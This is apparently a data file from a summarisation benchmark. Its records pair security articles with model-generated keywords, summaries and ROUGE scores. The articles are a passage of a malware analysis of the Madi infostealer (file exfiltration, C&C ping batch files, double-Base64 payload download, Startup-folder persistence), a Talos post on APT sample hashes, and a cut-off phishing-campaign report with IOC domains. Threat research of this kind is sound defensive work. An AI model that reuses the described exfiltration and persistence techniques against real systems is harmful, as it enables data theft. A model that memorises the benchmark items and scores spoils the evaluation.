in the malware folder. When one file is found, it checks if the file is indeed on the disk and accessible. It Base64 encodes it and saves it as nameoffile.BMH.KILOP. The non encoded version (BMH)is deleted, Timer 5 is re-enabled and it returns. Files are handled one by one, but the timer interval is very small, therefore it's almost instantaneous.Note: The resulting encoded files are those handled by Timer 20 described above. The process occurs as follows: Timer 9 enables Timer 19, which enables Timer 20 to upload files generated by Timer 5.Timer 21: Filesend.xls parserFilesend.xls has a list of files to exfiltrate.Upon execution, Timer 21 is disabled. If \"filesend.xls\" is present, it is opened and read.All the files to be exfiltrated are separated by the \"*\" character as in the example below:*C:Documents and Settings%USER%Desktoptoolsstealme.txt**C:Documents and Settings%USER%Desktoptoolsstealme2.txt*Timer 21 parses each entry, and will check whether the file exists. If it does, a copy of the file will be made in the malware directory with a .file.BMH extension. (In my example, we have: \"stealme.txt.file.BMH\".)Timer 10: Tracking what was uploaded and cleaning IE instrumentation pagesWhen a file has been uploaded using Timer 20, a POST is made to the sik.php file, a page is returned containing the name of the uploaded file, as well as the hardcoded string \"Save Shode\" as you can see on the screen capture below:Timer 10 is responsible for keeping track of some of the uploaded files. Exfiltrated files are added to the \"rafteha.zip\", which lists the files that have already been handled. The last file path to be handled is saved to the \"fileomade.xls\" file.Timer 15: Check for \"filesend.xls\"Timer 15 is disabled upon execution and \"filesend.xls\" is sought. If present, Timer 15 is enabled and it returns.If not, it checks whether Timer 1 is enabled. If Timer 1 is enabled, it enables Timer 15 and returns.If Timer 1 isn't enabled, Timer 15 checks the status of Timer 18. If it is enabled, Timer 15 re-enables itself and returns.If \"filesend.xls\" isn't present and both Timer 1 and Timer 18 are disabled, it creates a \"pangtkp.bat\" file, which contain \"ping C&C_IP >C:DOCUME~1%USER%TEMPLA~1iexplore.exe.pkklm\".That bat is executed, and both Timer 1 and 5 are enabled before returning.There are other timers that are in some way or other related to exfiltration and data stealing, but they are all fairly similar. There is a lot of redundancy in the malware.Timer 23: List all removable drives on the machineTimer 23 lists all the removable drives on the machine, enables Timer 24, Timer 23 disables itself and returns.Timer 24: Search and copy files from removable drivesTimer 24 receives the list of removable drives computed by Timer 23, and searches all the files on the devices.Stolen files will be copied to the malware directory with fildik.BMH extensions, which will later be encoded as fildik.BMH.KILOP (Base64) and exfiltrated.The list of processed files are stored inside raftehacool.zip.MiscellaneousThe infostealer contains 52 timers. Some of them do not perform any important tasks. The authors decided to ping the C&C server and save the results under specific file names. Those files are checked and parsed in order to find out if the C&C is up and if certain actions can be taken. This is pretty amateurish programming.Timer 44: simple ping via pangtipo.batTimer 44 is disabled upon execution. Timer 44 checks whether Timer 45 is enabled and returns if it is. (Timer 44 is enabled prior to returning.) If Timer 45 is disabled, a \"pangtipo.bat\" file is created, which contains \"ping C&C_IP >C:DOCUME~1%USER%TEMPLA~1iexplore.exe.pkxml\".The bat file is executed, Timer 44 is enabled and Timer 44 returns.Timer 11: Simple ping from pangtip.batTimer 11 is disabled upon execution.If Timer 16 is already enabled, Timer 11 re-enables itself and returns. If Timer 17 is already enabled, Timer 11 re-enables itself and returns.If none of the timers are enabled, it creates the \"pangtip.bat\" file, which contains \"ping C&C_IP >C:DOCUME~1%USER%TEMPLA~1iexplore.exe.pkxm\" and executes it via ShellExecute.Timer 16 is enabled and returns.Note: Timers 1, 7, 11, 15, 44 and 48 generate these batch files under different names and the results are saved under different names too.Timer 7: Was \"timeip.php\" visited?Timer 7 is disabled upon execution. Timer 7 checks whether the timeip.php page was visited. If not, it visits the page using IE instrumentation, Timer 7 disables itself and enables Timer 8 (see description below).It creates the \"pangip.bat\" file, which contain \"ping C&C_IP\". Results are saved as \"iexplore.exe.pkam\".Note: the file name used to save the output of the ping commands is based on the infostealer executable name, which is \"iexplore.exe\". If the executable is renamed, the log files will have different names.Timer 8: Parse the results of the timeip.php visitThe timeip.php script returns the current time and the IP address of the victim. The results of the visit (done with IE instrumentation in Timer 7) are saved into a buffer which is used during the keylogger log creation (see Timer 4 description).Timer 22: Ensure there is a backup copy of UpdateOffice (downloader)Note: The downloader is the only malware that starts after Windows boots. It's therefore important to ensure various backup copies are made.Timer 22 checks if \"UpdateOffice.exe\" is present in the infostealer directory (templates). It shouldn't be, as it is only present in the printhood directory. (See Downloader description at the beginning of the article.)Since it is not present, it calls a subroutine to get the path to the \"Printhood\" directory (GetSpecialFolderLocation with CSIDL_PRINTHOOD parameter). While concatenating the \"UpdateOffice.exe\" and the \"Printhood\" folder, the \"\" character is missing, and therefore, the routine is bugged. The returned string is: \"C:Documents and Settings%USER%PrintHoodUpdateOffice.exe\" insteadof \"C:Documents and Settings%USER%PrintHoodUpdateOffice.exe\".It then copies (or at least tries to, as the path is wrong) \"C:Documents and Settings%USER%PrintHoodUpdateOffice.exe\" as \"srAntiq.dll\" in the Templates folder.If \"OfficeUpdate.exe\" isn't present in the \"printhood\", a copy is made from \"srAntiq.dll\".It retrieves the path to the Startup Folder using the CSIDL_STARTUP: \"C:Documents and Settings%USER%Start MenuProgramsStartup\".Timer 22 checks whether \"OfficeUpdate.exe\" is present in that folder; if not, it will make a copy of srAntiq.dll to the Startup folder and returns from Timer 22.Timer 25: Check for \"fsdiskget.dll\"Timer 25 checks if \"fsdiskget.dll\" is present in the malware directory; if not, it returns.If the file is present, it enables Timer 23 (see the Data Stealing section for a description).Timer 42: lbdiskgo.dll, soltanik.dll and res.exe checkingTimer 42 checks whether a flag (set by Timer 34 and cleared by Timer 33) is set to 0 and if lbdiskgo.dll, soltanik.exe and res.exe are present. If they are, it enables Timer 33; otherwise, it returns.Timer 43: lbdiskgo.dll / ladine.dll / res.exe checkingTimer 43 returns directly if neither \"lbdiskgo.dll\" or \"ladine.dll\" are present. If res.exe is present, it enables Timer 44 and Timer 48; otherwise, it returns.Timer 45: Visit the ReReReRe.htm pageTimer 45 deletes pangtipo.bat, reads iexplore.pkxml to make sure the C&C replied. (Timer 1 and Timer 16 provides some more details on the use of such .bat files.)Uses FindWindow to check whether IE Instrumentation has been used to visit the special ReReReRe.html page, which contains the following title: \"r!r!r!r!\".It looks for different variants such as \"r!r!r!r! - Windows Internet Explorer\" or \"r!r!r!r! - Microsoft Internet Explorer\".If one of them is found, it means the page was visited using IE instrumentation. It disables Timer 45 and returns.If none of them are found, Timer 45 will visit the URL url enable Timer 46 (see below), disable Timer 45 and return.Timer 46: Parse \"ReReReRe.htm\" (downloaded by Timer 45)Timer 46 goes through all the different running instances of instrumented IE, looking at the title of each HTM page. The main interest here is \"r!r!r!r!\".This page is the ReReReRe.htm file downloaded by Timer 45. Timer 46 looks for a special EOF (End Of File) marker: \"tamamshodfile\". This marker is used by the infostealer to make sure the htm page was fully downloaded.Once the page has been confirmed as valid, it looks for the textarea id S1 which holds double Base64 encoded PE Files.The Base64 encoded data is saved as: ASLASLKK223.dll.Timer 47: Double decoding of Base64 encoded payload from ReReReRe.htmNote: Timer 46 saves the payload as ASLASLKK223.dll.Since the payload file is double encoded, the decoding is performed in two steps:ASLASLKK223.dll is decoded to ASLASLKK224.dll to get a single encoded Base64 file. ASLASLKK224.dll is decoded to \"res.exe\" : Final PE file.Res.exe is a copy of the Resource Hacker utility. ASLASLKK224.dll is deleted. The use of Res.exe is described in the analysis of Timer 39 below.Once Timer 47 has finished enumerating all the IE instances, it will call a cleaning routine. It searches for \" - r!r!r!r! - Windows Internet Explorer\" and different variants described in Timer 45 and sends a \"WM_Close\" Message to IE Windows in order to close them.Among all those captions, it also searches for \" - 404 - File or directory not found.\" and variants of 404 pages.Once the cleaning is completed, Timer 47 disables itself and returns.Timer 49: Visit the SeSeSeSe.htm pageTimer 49 is almost identical to Timer 45. The only difference is the page visited: SeSeSeSe.htm instead of ReReReRe.htmSee the Timer 45 description for details.Timer 50: Parse \"SeSeSeSe.htm\" (downloaded by Timer 49)Timer 50 is almost identical to Timer 46. The only difference is the page parsed: SeSeSeSe.htm instead of ReReReRe.htm and local file names. The double encoded payload is saved as \"ASLASLKK2231.dll\".See the Timer 46 description for details.Timer 51: Double decoding of Base64 encoded payload from SeSeSeSe.htmNote: Timer 50 saves the payload as ASLASLKK2231.dll.Since the payload file is double encoded, the decoding is performed in two steps:ASLASLKK2231.dll is decoded to ASLASLKK2241.dll to get a single encoded Base64 file. ASLASLKK2241.dll is decoded to \"Ladine.dll\": final PE file.Note: At the time of writing, the SeSeSeSe.htm page had been removed from the C&C server.A C&C server used by older variants of the infostealer is still available and the old page name was \"SSSS.htm\". The embedded file is a template of a downloader executable (see Timers 35, 36, 37, 38 and 39 for further information).Once Timer 51 has finished enumerating all the IE instances, it will call a cleaning routine. It searches for \" - s!s!s!s! - Windows Internet Explorer\" and different variants described in Timer 45, and sends a \"WM_Close\" Message to IE Windows in order to close them.Among all those captions, it also searches for \" - 404 - File or directory not found.\" and variants of 404 pages.Once the cleaning is completed, Timer 51 disables itself and returns.BETA/NON-WORKING FEATURES: New executable generationThere are a few timers in the infostealer that are related to a missing file. I managed to find a copy of the missing file from an older command and control server, in order to understand the intentions of the authors.The missing file is downloaded by Timer 50: SeSeSeSe.htm. It's not present on the current C&C servers.If we were to replace the SeSeSeSe.htm with an old copy (originally SSSS.htm), Timer 51 would produce a file called \"Ladine.dll\", which is a template executable of the Trojan downloader used to install the infostealer.Timer 52: Copy Ladine.dll to \"Soltanik.exe\"Timer 52 makes a copy of \"Ladine.dll\" under the name \"soltanik.exe\", which is the template file.Timer 35: Clean files from Timer 39Timer 35 is disabled. A special BOTID is created by concatenating \"CoolDiskGo(\" with \"BOTID_TMP)\", e.g.: CoolDiskGo(MYCOMPUTER-8712422C6C7704EF)Timer 35 puts the C&C IP address in a global variable that will be used by Timer 38.Timer 35 tries to delete the following several files created by Timer 39: 1.txt, res.ini, res.log, Icon_1.ico,output.rc and server.exe.It does several other things which are not relevant to what I describe here, so I've omitted any reference to those actions.Timer 36 is enabled before returning.Timer 36: Enable Timer 37 if 1.txt isn't found - logic/code bugTimer 36 is disabled upon execution. If \"1.txt\" isn't present, Timer 37 is enabled. Otherwise, it calls a Base64 decoding function. 1.txt must be a valid Base64 encoded stream of bytes; otherwise, an exception occurs and Timer 36 returns.Timer 37: Update resource for the template downloader: Soltanik.exeTimer 37 is disabled upon execution. A structure exception handler is installed before reading 1.txt.In the event of an exception the SEH handler will enable Timers 42, 34, 33, 35, and Timer 37 will return.Timer 37 expects 1.txt to be present and here is the logic bug. Timer 37 is only enabled when 1.txt isn't present, by Timer 36. Let's ignore the reasons for its creation and continue analyzing the intentions of the authors.Timer 37 calls the BeginUpdateResource (with the bDeleteExistingResources parameter set to 0), and start updating the resources of the template executable (soltanik.exe) in RCDATA.A MAHDI entry is added, with the Base64 content from 1.txt. This works in exactly the same way as the downloaders with social engineering features.Timer 38 is enabled, and Timer 37 returns.Note: At the end of Timer 37, Soltanik has been modified to have a new resource: MAHDI.Timer 38: Update more resources from the template downloader (Soltanik.exe)Several entries are added to RCDATA:Shelikn : Special BotID generated by Timer 35 SiteW: C&C IP address Bind: Empty (according to analysis of the downloaders that use social engineering, it should be the extension of the embedded file dropped to social engineering victims. If MAHDI contains a Base64 encoded picture, Bind should be set to .JPG). Filee: SCR Roze: 0Once the resources have been updated, Timer 39 is enabled and Timer 38 returns.Timer 39: Generate a final binary: Server.exe with updated iconAt the end of Timer 38, soltanik.exe has been fully updated with new resources. Upon execution, Timer 39 disables itself and starts generating a special command line for the Resource Hacker tool that was created as \"Res.exe\" by Timer 47.The command line is the following:There is a bug in the routine. An executable name is missing right after \"-extract\".The command line dumps the Main Icon to disk (Icon_1.ico) and creates a file called \"output.rc\".At this point, it is impossible to know which file was meant to be used as the source of a new icon. For the sake of our analysis, let's pretend the bug doesn't exist and that a valid file name was provided.Afterwards, a second command line is passed to \"Res.exe\":This final command line will generate Server.exe, a copy of soltanik.exe whose icon has been changed to the one extracted in the previous command.Server.exe is now fully updated. Its resources are filled, and its icon changed. It's not clear why the authors did this, but despite all the bugs it was possible to understand the overall aim of the routine: to create a Server.exe file from soltanik.exe with a new icon and added resources. What happens to Server.exe? Nothing, this is a non-working feature. It appears Madi has the ability to generate new downloaders, at least, in theory.The 7 remaining timers won't be described as they are of little interest.ConclusionsIn this article we closely analyzed the infostealer used in the Madi campaign. The coding style and the usage of Delphi, together with the programming techniques indicate a rudimentary approach.Most of the data-stealing actions and communication with the C&C servers take place via external files, which is rather messy. Whoever coded it is probably still reading through the first chapters of their Delphi manuals.This is maybe why it is surprising to note its effectiveness, considering the data received from the sinkhole. During the monitored period, a little over 800 victims were connected to the servers. All of themfell prey to the various social engineering techniques used by the malware.To sum up, we can say the following:the components of the Madi campaign are surprisingly unsophisticated no exploits or advanced 0-day techniques are used anywhere in the malware despite that, the overall success of the campaign is surprisingly high nevertheless, we should remember that even low quality malware can steal data Madi was a low investment, high profit project its authors remain unknownWe will continue to monitor the Madi malware and update you on our findings in the future. ", "generated_text": "the Middle East; users; the malware; downloaders; the installer; Delphi; a keylogger; the infostealer; Delphi Timers; a Delphi keylogger; timers; the Delphi keylogger; the DLL; commands; the BOT prefix; the executable; a BOT; a reverse shell; time; The software; the user; the local network; the malware; the Middle East; the Middle East.", "ref_text": "<START-1>The document analyzes the \"Madi\" malware campaign that has infected over 800 victims primarily in the Middle East by targeting Iran, Israel, and Afghanistan. - The malware is delivered via spearphishing emails containing malicious PDF attachments that install the malware if opened. - Two main components are installed - a dropper and a data-stealing module. The malware uses 52 timers to control its activities. - It captures keystrokes, screens, audio, scans drives, and exfiltrates documents and files back to its command and control servers. The data is encrypted and encoded. - The malware tracks infections via campaign IDs and logs system info like IP, OS, and machine name. It uses social engineering and fake files to avoid detection. - The coding techniques are basic and bugs exist, indicating amateur developers. But the campaign has still successfully compromised many targets. - Non-working features suggest the ability to generate new malware executables was being developed. The malware continues to be active and monitored. - While unsophisticated, the malware is effective at stealing data from infected systems. Low-tech malware remains a threat and this campaign in particular has had high success rates despite its simplicity. In summary, the document analyzes an active, low-tech but effective malware campaign targeting the Middle East that is stealing data from compromised systems. <END-1>", "t5/keyword/hint_hit_precision": 0.12, "t5/word/hint_hit_recall": 0.027906976744186046, "gpt3/lexical/rouge_rouge1": 0.36990595611285265, "gpt3/lexical/rouge_rouge2": 0.11987381703470032, "gpt3/lexical/rouge_rougeL": 0.22570532915360503, "gpt3/lexical/rouge_rougeLsum": 0.22570532915360503, "gpt3_generated_text": ["This article provides a detailed analysis of the 'Madi' infostealers, a malware campaign targeting computer systems in the Middle East, specifically users in Iran, Israel, Afghanistan, and globally. The malware is installed through downloaders that use social engineering techniques or simply download and install the infostealer. The infostealer, written in Delphi, uses Delphi Timers and a keylogger to gather information. The malware communicates with a command and control server to receive commands and execute various malicious activities. The infostealer also creates a BOT prefix based on the computer name and local network information. The malware is poorly coded, with numerous bugs and reliance on external files for commands."]}, {"split_name": "val", "sample_id": "val_62", "prompt_text": "Extract the keywords: THURSDAY,JANUARYRESEARCH SPOTLIGHT: NEEDLES IN A HAYSTACKThis post was authored by Mariano Graziano.Malware sandboxes are automated dynamic analysis systems that execute programs in a controlled environment. Within the large volumes of samples submitted daily to these services, some submissions appear to be different from others and show interesting characteristics. At USENIX Security 2015 I presented a paper in which we proposed a method to automatically discover malware developments from samples submitted to online dynamic analysis systems. The research was conducted by dissecting the Anubis sandbox dataset which consisted of over 30M samples collected in six years. The methodology we proposed was effective and we were able to detect many interesting cases in which the malware authors directly interacted with the sandbox during the development phase of the threats.Another interesting result that came from the research concerns the samples attributed to Advanced Persistent Threat (APT) campaigns. Surprisingly, some of the malware samples used in these sophisticated attacks had been submitted to the Anubis sandbox months -- sometimes even years -- before the attack had been attributed to the proper APT campaign by a security vendor. To be perfectly clear, we are not saying that it took security vendors months or years to detect a threat. Most times, we are able to detect the threats in no more than a few hours. It is just that the malware samples were mislabeled and not properly associated with APT campaigns. In general, the same goes for non-APT malware campaigns. In this blog post, we tried to see if the same applied to the Cisco dataset. Speci\ufb01cally, we chose ten APT campaigns, -- some of which were already covered in the  Usenix paper. We decided to inspect two different datasets: our incoming sample feeds / malware zoo, and the telemetry associated with our Advanced Malware Protection (AMP) solutions. Talos receives samples from over 100 external feeds ranging from anti-malware companies to research centers, while the AMP dataset contains telemetry from the Cisco AMP user-base.The remaining part of this post is organized as follows. First, we show the APT campaigns we investigated. Second, we summarize the results of the analysis of the Talos dataset. Third, we show the results from the AMP dataset. Finally, we summarize our \ufb01ndings. Third, we show the results from the AMP dataset. Finally, we summarize our \ufb01ndings. APTCAMPAIGNSAPT CAMPAIGNBeebus Paci\ufb01c RAT Regin Net TravellerBrutPOSMADE PUBLIC February 2015July 2014November 2014 January 2010July 2014 June 2013 July 2014The ten malware campaigns in the table above garnered signi\ufb01cant media attention when  discovered, with some of them clearly falling in the area of APT. They were found by different security companies between 2010 and 2015, having different levels of sophistication and different objectives. Moreover, these APT campaigns were not limited to western countries. They have affected organizations all over the world. Most of the time, connecting the dots and drawing relationships between samples and campaigns take months and many experts. This means the security company that releases a detailed report documenting the campaign is aware of it long before the information is made public. However, we believe the \u201cpublic release\u201d date is still a good metric, because it is the moment at which all the other security companies and the entire world are made aware of these threats.Another important aspect during an APT investigation is attribution. While detection is done quickly, attribution for these campaigns is often an open and hard problem to solve. Most of the times the perpetrators remain unknown even after months of work by security researchers. However, sometimes researchers are able to connect the dots and attribute the attack to a threat actor. This was the case for some of the APT campaigns discussed so far. Some of these threats have been attributed to state-sponsored actors, others to cyber criminals or to espionage attacks. However, like in the USENIX publication, in this post we will make no speculation about attribution.In the next paragraphs, we will present the results of searching for samples associated with these APT campaigns in our datasets.TALOSDATASETAPTCAMPAIGNBeebus Paci\ufb01c RAT Regin Net TravellerBrutPOSAVG DAYS BEFORE APT CAMPAIGNPUBLICALLY IDENTIFIED574 68This table shows the results of the analysis of our incoming sample feeds/malware zoo. For every campaign, we checked in our malware zoo to see when they had been initially submitted to us. Given that we know when information about these APT campaigns was made public, we can compute the number of days it took the security community to publicly tie the samples to an APT campaign, even though the samples had been marked malicious for other reasons. On average, these samples went for 458 days before being tied to an APT campaign. The table presents the average number of days for the entire campaign, and we go from a few months as in the case of \u201cAurora\u201d to more than three years for \u201cEquation\u201d. Notice that these \ufb01gures come from our malware zoo which collects  samples from external sources and in general are a good indicator given the amount of samples received per day. Notice that these numbers vary based on the dataset.VIRUSTOTALThe vast majority of the submissions come from big organizations such as Antivirus companies. Interestingly, a signi\ufb01cant percentage is submitted by  VirusTotal. For this reason we decided to check the submitters for possible links and intelligence information. As already documented by Dixon, information about the submitters of samples is not publicly available, but can partially be retrieved from their Intelligence service. For every sample, it is possible to know a hash (a hexadecimal unique identi\ufb01er of the submitter), the  country (from the geolocalization of the IP address of the submitter) and the method (the way the sample has been submitted, for instance via the web interface or the APIs). This opaque information complicates the analysis a little bit, but it is still possible to obtain interesting results.SUBMITTERCAMPAIGNS6exxxxxx14xxxxxx b4xxxxxxAridViper Nettraveller RedOctober BrutPOSPittyTigerAridViper ReginAridViper Regin Nettraveller BrutPOS PittyTiger AridViper Nettraveller Paci\ufb01cRAT BrutPOS PittyTigerEquation Regin BrutPOS AurorEquation Regin BrutPOSRegin ReginBeebus PittyTiger Nettraveller BrutPOSAuroraThe table above summarizes our \ufb01ndings from VirusTotal. The \ufb01rst column shows the   hash of the submitter. This means that the submitter sent one or more samples of a given APT campaign to VirusTotal before its public release. One can only speculate on who these submitters are. They could very likely be the threat actors themselves, testing to see if their malware is detected by the AV companies. They could also be security researchers or vendors who are trying to get information from VirusTotal. It is noteworthy that in most of the cases the same submitters uploaded samples belonging to different APT campaigns.CISCOAMPWe went through our logs to search for entries that contained hashes related to the ten APT campaigns we have been investigating. Interestingly, we got hits for eight different hashes belonging to three different campaigns that were discovered on Cisco AMP customer machines before the APT campaign was publicly identi\ufb01ed. APT CAMPAIGN (NUMOF SAMPLES)Arid Viper (1 SAMPLE) Equation (1 SAMPLE) BrutPOS (6 SAMPLES)DAYS BEFORE APT CAMPAIGNPUBLICALLY IDENTIFIED-50 +1 -64As illustrated in the table above, we identi\ufb01ed eight malicious samples that were in the  wild before being associated with APT campaigns. It is important to repeat that most of these samples were detected as malicious the moment they \ufb01rst appeared on our these samples were detected as malicious the moment they \ufb01rst appeared on our  customers\u2019 machines.Surprisingly, one sample of the Equation APT campaign (fanny worm) was found and blocked on a Cisco AMP customer\u2019s machine a day after the public release of the Kaspersky report.HASH (SHA256)DATE DISPOSITION APT003315B0AEA2FCB9F77D29223DD8947D0E6792B3A0227E054BE8EB2A11F443D92015-02-17MALICIOUSEQUATION003315B0AEA2FCB9F77D29223DD8947D0E6792B3A0227E054BE8EB2A11F443D92015-02-17MALICIOUSEQUATION015FBC0B216D197136DF8692B354BF2FC7BD6EB243E73283D861A4DBBB81A7512014-12-20UNKNOWNARID VIPER015FBC0B216D197136DF8692B354BF2FC7BD6EB243E73283D861A4DBBB81A7512014-12-20MALICIOUSARID VIPER015FBC0B216D197136DF8692B354BF2FC7BD6EB243E73283D861A4DBBB81A7512015-01-02MALIICIOUSARID VIPER015FBC0B216D197136DF8692B354BF2FC7BD6EB243E73283D861A4DBBB81A7512015-01-16MALICIOUSARID VIPER015FBC0B216D197136DF8692B354BF2FC7BD6EB243E73283D861A4DBBB81A7512015-02-12MALICIOUSARID VIPER14BFDA4A4ACA1276388702D0FB7629AF120FF34C1ACDEB7613815F2981C998322014-05-07MALICIOUSBRUTPOS508909C8A00026C904F52099DD62BBF4062B4E8E40FC0601BD9E13570514B4F52014-05-06MALICIOUSBRUTPOS7170A07BCB5B0467A75CBD17A1A1877AEC3C8EA43C45D3BED6AB5E6C95A627132014-05-06MALICIOUSBRUTPOS9A10916AD0F43FA3376C2E54FD5CFDD06D684B3A19895ED4107FAF9F3313DCDA2014-05-07MALICIOUSBRUTPOSE28EABEB678AFB5E172F4127C5692E742809FD86DFA8478C1DC6F9C13B2A8E5F2014-05-06UNKNOWNBRUTPOSE28EABEB678AFB5E172F4127C5692E742809FD86DFA8478C1DC6F9C13B2A8E5F2014-05-07MALICIOUSBRUTPOSBased on our logs, Cisco AMP found the sample 015FBC0B216D197136DF8692B354BF2FC7BD6EB243E73283D861A4DBBB81A751 twice on 2015-12-20. It was \u201cunknown\u201d to AMP the \ufb01rst time, but detected as malicious the  was \u201cunknown\u201d to AMP on 2014-05-06, but detected as malicious the next time it was seen on a customer\u2019s machine on 2014-05-07. In all the other cases the samples were already considered malicious.CONCLUSIONAs the number of threats per day continues to increase, the number of malware samples security companies automatically analyze increases. Much of the analysis is comprised of dynamic analysis systems, such as sandboxes, to determine whether the sample is malicious or not. These samples are then stored for further analysis. Due to the large numbers of samples, in many organizations the vast majority of these samples remainnumbers of samples, in many organizations the vast majority of these samples remain categorized solely on the initial sandbox run. Even when these samples are shared among companies or via other services like VirusTotal some malware samples can go unnoticed for months because they are marked as malware but given some generic name, such as \u201cWin.Trojan.Agent\u201d. Then we are shocked when a security company discovers an APT campaign that has supposedly gone unnoticed for years.The results of this post con\ufb01rm the assumption of the Usenix  paper, also based on a dataset of a big security company and similar results are expected throughout the security industry. Many times, malware is initially submitted to sandbox systems and marked as malicious based on the output of the sandbox. Then the authors use that information to tweak the sample to avoid detection in future sandbox runs through various evasion tactics. In other situations, the initial sample may not even be \ufb02agged as malicious due to  evasion techniques being utilized. By performing statistical analysis and reducing the data through clustering, even samples that avoid initial sandbox detection can potentially be detected as malicious. There is clearly a need for more advanced analytical systems to identify campaigns and link the samples together.Identifying today\u2019s threats requires multiple layers of protection at various points across the network, along with constantly updated threat intelligence information. Cisco analyzes a massive amount of telemetry data and is able to \ufb02ag malware as malicious based on  multiple factors. By performing manual and programmatic analysis of sandbox data in conjunction with identifying behaviors which are associated with malicious activity, even unknown APT campaigns can be neutralized.RT LENO COMMENTS:POST A COMMENTEnter your comment Comment as: Select profile Publish COTMOM:ENSSUEBARCHSUBSCRPostsCommentsSubscribe via EmailL Bypassing MiniUPnP Stack Smashing ProtectionYBypassing MiniUPnP Stack Smashing Protection Research Spotlight: Needles in a Haystack Microsoft Patch Tuesday - January 2016 Rigging compromise - RIG Exploit Kit\u25ba 2 Good People Goodness: A Toast to Kanouff, Clemson, and Raman! Snort Subscriber Rule Set Update for 05/11/2016 ClamAV 0.99.2 has been released!NLVLOARMOT\u00aeBDGGLEDBLOGSOGSoftware CommunityVulnerability Reports Additional ResourcesMicrosoft to SID Mapping Archive Shared Object Rule GeneratorIP Blacklist DownloadAWBO ExercisesAbout Talos Join Our TeamContact BlogCONNECT WITH US\u00a9 2015 Cisco Systems, Inc. and/or its af\ufb01liates. All rights reserved. View our  Privacy Policy here. ", "generated_text": "PDF; ten advanced persistent threat campaigns; use; the malware samples; APT campaigns; the analysis; Talos; samples; an overview; analysis; the Talos malware zoo; telemetry; malware samples; years; malicious activity; the malware authors; the attacks; the analysis; the attribution; espionage; the attackers; time; attribution.", "ref_text": "<START-1>The PDF is a blog post by Cisco Talos describing their analysis of past APT malware campaigns in their threat intelligence datasets. They looked at 10 major APT campaigns made public between 2010-2015, including campaigns like Aurora, Equation, Red October etc. Attribution is not discussed. They searched for these malware samples in the Talos malware zoo (feeds from AV companies, researchers etc.) and found samples for most campaigns existed in their zoo months or years before public disclosure of the APT campaigns. On average, it took 458 days after initial detection for samples to be publicly tied to an APT campaign. The gap was as high as 3 years for Equation samples. Analysis of VirusTotal submitters showed certain entities had submitted samples from multiple campaigns, indicating possible links between campaigns or actors. In the Cisco AMP customer telemetry, they found pre-dated samples related to 3 campaigns. Most were detected as malicious when first seen, but some evaded initial detection. The post concludes that while detection happens quickly, connecting samples to campaigns takes longer due to high volumes of generic malware. Sandbox evasion also delays detection. Their findings validate that threat actors submit samples to test defenses prior to attacks. Better analytics are needed to identify and correlate samples early to discover stealthy campaigns in progress. <END-1>", "t5/keyword/hint_hit_precision": 0.34782608695652173, "t5/word/hint_hit_recall": 0.06046511627906977, "gpt3/lexical/rouge_rouge1": 0.37249283667621774, "gpt3/lexical/rouge_rouge2": 0.08069164265129683, "gpt3/lexical/rouge_rougeL": 0.1948424068767908, "gpt3/lexical/rouge_rougeLsum": 0.1948424068767908, "gpt3_generated_text": ["The research spotlight article discusses the analysis of malware samples associated with ten advanced persistent threat (APT) campaigns in the Talos dataset. The study focused on APT campaigns such as Beebus, Pacific RAT, Regin, Net Traveller, and BrutPOS, examining the timeframe between when the malware samples were initially submitted and when the campaigns were publicly identified. The research aimed to provide an overview of the malicious activity linked to these campaigns and the attribution of the attacks, without speculating on the identity of the attackers. The analysis uncovered interesting findings, including the presence of malware samples in the dataset months or even years before the campaigns were officially recognized. The study highlights the importance of timely detection and attribution in cybersecurity research and the challenges of connecting malware samples to APT campaigns."]}, {"split_name": "val", "sample_id": "val_63", "prompt_text": "Extract the keywords: Cyber espionage campaign targets renewable energy companiesbleepingcomputer.com/news/security/cyber-espionage-campaign-targets-renewable-energy-companiesBill ToulasJanuary 17, 2022A large-scale cyber-espionage campaign targeting primarily renewable energy and industrial technology organizations have been discovered to be active since at least 2019, targeting over fifteen entities worldwide.The campaign was discovered by security researcher William Thomas, a Curated Intelligence trust group member, who employed OSINT (open-source intelligence) techniques like DNS scans and public sandbox submissions.Thomas' analysis revealed that the attacker uses a custom 'Mail Box' toolkit, an unsophisticated phishing package deployed on the actors' infrastructure, as well as legitimate websites compromised to host phishing pages.Most of the phishing pages were hosted on \"*.eu3[.]biz\", \"*.eu3[.]org\", and \"*.eu5[.]net\" domains, while the majority of the compromised sites are located in Brazil (\"*.com[.]br\").Targeting the renewable energy sector1/4The phishing campaign's goal is to steal the login credentials of those working for renewable energy firms, environmental protection organizations, and industrial technology in general.Examples of organizations targeted by the phishing attacks include:Schneider Electric University of Wisconsin California State University Utah State University Kardzhali Hydroelectric Power Station (Bulgaria) CEZ Electro (Bulgaria) California Air Resources Board Morris County Municipal Utilities Authority Taiwan Forestry Research Institute Carbon Disclosure Program Sorema (Italian recycling firm)Phishing sites set up for stealing employee credentialsSource: blog.bushidotoken.netThe researcher couldn't retrieve any samples of the phishing emails used in the campaign, but Thomas believes the emails used a \"Your Mail Box storage is full\" lure based on the landing pages.Unknown actor Thomas couldn't attribute this campaign to any specific actors, but evidence points to two clusters of activity, one from APT28 (aka FancyBear) and one from Konni (North Korea actors).Google Threat Analysis Group researchers have recently found phishing activity attributed to APT28, which uses several \"eu3[.]biz\" domains.2/4Since mid-Dec, @Google TAG has detected ongoing APT28 cred phishing campaigns targetingUkraine. Some IOCs:consumerpanel.eu3[.]biz consumerpanel.eu3[.]orgconsumerspanelsrv.eu3[.]orgprotectpanel.eu3[.]bizupdateservicecenter.blogspot[.]com\u2014 billy leonard (@billyleonard) January 14, 2022An overlap point for both groups is that the hostnames used for phishing credentials are owned by Zetta Hosting Solutions, a name that has appeared in many analyst reports recently.\"Konni\" used Zetta Hosting Solution domains in the Diplomat-targeting campaign uncovered by Cluster25, and also in a T406 (Korean hackers) campaign analyzed by Proofpoint.Thomas explained to BleepingComputer that many APT hacking groups use Zetta in malicious campaigns.\"Zetta is used a lot by APTs and malware, and I'd be very surprised if they didn't know. They're not a huge company. Threat actors also like these types of free hostname services where they can setup infrastructure quickly, freely, and anonymously.\" - Thomas.However, the researcher underlined that he doesn't have proof or concrete evidence that Zetta Hosting is knowingly helping malicious campaigns.Focus on Bulgaria and potential motive Apart from the two entities mentioned in the victimology section above, the researcher has noticed a small cluster of activity from 2019 linked to the same infrastructure targeting multiple Bulgarian banks.Phishing URLs targeting Bulgarian banksSource: blog.bushidotoken.netThe researcher believes that the adversary is financially supported by entities interested in fossil fuels, particularly someone selling energy to Bulgaria who sees renewables as a threat.The previous targeting of banks could be an attempt to gather intelligence on the funding and construction of new renewable energy facilities.3/4APT28 is a Russian group linked to the state, and Bulgaria is known to import significant amounts of Russian natural gas, so the link between this campaign and the 